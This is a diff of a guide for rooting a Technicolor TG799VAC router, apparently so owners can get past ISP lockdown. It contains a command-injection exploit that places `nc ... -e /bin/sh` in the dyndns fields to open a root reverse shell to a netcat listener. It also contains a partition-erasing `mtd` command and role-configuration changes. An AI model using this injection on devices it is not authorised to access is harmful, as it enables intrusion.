@@ -26,8 +26,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ##### Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..
 
-###### You have to add our admin user to upgradefw role and after this has been done you will get access. I have added a preview below the commands where to upload your new firmware (THIS IS DANGEROUS - DONT PLAY WITH THIS IF YOU 
-HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH WRONG FIRMWARE, PERMANENT!):
+###### You have to add our admin user to upgradefw role and after this has been done you will get access. I have added a preview below the commands where to upload your new firmware (THIS IS DANGEROUS - DONT PLAY WITH THIS IF YOU HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH WRONG FIRMWARE, PERMANENT!):
 
     uci add_list web.uidefault.upgradefw_role='admin'
     uci commit
@@ -42,14 +41,19 @@ HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH W
 
 ![Screenshot](files/wuseman.pwned.telia.png)
 
+##### Install packages (If things got fucked up cause of space or something similiar then just begin from 0 again with command):
+
+     'mtd -r erase rootfs_data':
+
+![Screenshot](files/install-opkg-packages.gif)
+
 # HOWTO GET ROOT ACCESS FROM WEBGUI:
 
 ##### Let us begin to hack for real now.. Set up a netcat listener on your machine, and adjust any firewall rules to allow an inbound connection:
 
     nc -lvvp [machine_port]
 
-##### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press 
-save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.
+##### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.
 
     :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
 
@@ -61,8 +65,11 @@ save and just wait 4-5 seconds and you have just got full root access of your TG
     exit                                                                   
     ssh -p 60022 root@192.168.1.1                                           
 
+##### Install packages from any arch:
 
-##### If WEBGUI is broken then you allways can reset your router with 'rtfd -all' command, use 'rtfd --soft' for keep settings.
+
+
+##### If WEBGUI is broken then you allways can reset your router with 'rtfd --all' command, use 'rtfd --soft' for keep settings.
 
 ![Screenshot](files/reset-router-with-rtfd-if-webgui-crashed.gif)
 
